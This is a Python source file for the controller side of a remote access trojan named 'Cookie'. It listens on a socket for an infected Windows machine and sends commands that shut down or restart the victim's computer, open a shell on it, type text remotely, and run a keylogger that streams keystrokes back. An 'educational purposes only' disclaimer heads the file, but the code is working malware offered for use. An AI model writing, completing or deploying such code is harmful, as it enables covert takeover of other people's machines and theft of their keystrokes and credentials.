
#Code and Developed By Caleb Gucciardi Italy
#I take no responsibility for this code
#Software created for educational purposes only
#Use only in a protected and authorized environment
#--FreeeSoftware--CopyLeft--MakeItBetter--
#Coockie v1.0 for Windows

import socket,time
from threading import Thread

sem="1"
push=""

class listener(Thread):
    def run(self):
        global sem,push
        print("--write 'esc' for <com::>--")
        print("--write 'push' for print buffer--")
        while 1:
            s=input("key::")
            if(s=="push"):
                print(push)
                push=""
            elif(s=="esc"):
                sem="0"
                break

def man():
    print("------------------------------------------------")
    print("--Cookie Help--")
    print("--when you are in <com::> you can send a command--")
    print("--when you are in <key::> you are in keylogger mode-- write 'esc' for quit at <com::>") #this is the KeyLogger function
    print("down --shutdown the machine")
    print("restart --restart the machine")
    print("close --exit from the shell and close the connection")
    print("google --start google on browser")
    print("facebook --start facebook on browser")
    print("shell --open a cmd in victime's machine")
    print("key --start <key::> keylogger mode")
    print("r <string> --write on victime's machine the string") #this the RobotWriter function
    print("r --press Enter on victime's machine")
    print("----------------------------------------------")

def keylogger():
    global com,sem,push
    sem="1"
    push=""
    l = listener()
    l.start()
    while sem=="1":
        c.send(com.encode())
        t = c.recv(1024) #confirm == cookie
        push+=t.decode()
    print("Quit from <key::>")
    c.send("esc".encode())
    com = "cookie"
    
        




print('''        ************************************************************
        *           ________                                       *
        *          / ..   . \        ___   __   __         ___     *
        *	   |    .   |       ||    |  | |  | |/ || ||__     *
        *	   |  .     |       ||__  |__| |__| |\ || ||__     *
        *	   \.____.__/                                      *
        *		    ________                               *
        *		    \  .  . \                              *
        *		      \   . |                              *
        *		      / ..  |                              *
        *		    /_______/                              *
        *                                                          *
        ************************************************************''')

#main

s = socket.socket()

host=input("IPServer::")
port=7373
confirm = "cookie"

s.bind((host,port))
s.listen(5)
print("Waiting for Cookie...")
c,addr=s.accept()

print("---------------------------------------")
print("---Digit help for a list of commands---")
print("---------------------------------------")

confirm = c.recv(1024) #confirm == cookie
print(confirm.decode())


while 1:
    com=input("com::")
    if(com=="help"): man()
    elif(com=="key"): keylogger()
    elif(com=="close"):
        c.close()
        s.close()
        break
    c.send(com.encode())
    confirm = c.recv(1024) #confirm == cookie
print("Bye bye..")






